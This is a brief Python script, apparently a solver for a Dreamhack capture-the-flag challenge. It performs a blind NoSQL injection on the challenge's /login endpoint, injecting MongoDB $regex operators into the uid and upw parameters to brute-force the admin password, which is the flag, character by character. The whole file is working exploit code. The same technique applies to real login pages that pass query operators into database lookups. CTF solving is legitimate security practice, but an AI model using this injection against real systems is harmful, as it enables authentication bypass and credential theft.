import requests
import string

digits_letters = string.digits + string.ascii_letters
HOST = "http://host3.dreamhack.games:15236"
flag = ""

for i in range(32):
    for ch in digits_letters:
        response = requests.get(
            f"{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}"
        )
        if "admin" in response.text:
            print(f"DH{{{flag}*}}")
            flag += ch
            break

print(f"DH{{{flag}}}")
